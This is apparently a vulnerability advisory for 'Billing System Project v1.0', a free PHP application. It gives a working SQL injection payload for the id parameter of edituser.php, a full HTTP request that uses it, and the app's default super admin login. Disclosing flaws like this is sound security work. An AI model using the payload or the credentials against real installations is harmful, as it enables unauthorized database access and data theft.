# Billing System Project v1.0 by mayuri_k has SQL injection

BUG_Author: Mogui Dong

Login account: mayurik/rootadmin (Super Admin account)

vendors: https://www.sourcecodester.com/php/14831/billing-system-project-php-source-code-free-download.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /phpinventory/edituser.php?id=

Vulnerability location: /phpinventory/edituser.php?id=, id

dbname = store1,length=6

[+] Payload: /phpinventory/edituser.php?id=-1%27%20union%20select%201,database(),3,4--+ // Leak place ---> id

```sql
GET /phpinventory/edituser.php?id=-1%27%20union%20select%201,database(),3,4--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=5g4g4dffu1bkrg9jm7nr42ori2
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/191214458-3236be1e-02e3-402a-94a3-ffa2bdd2d05d.png)
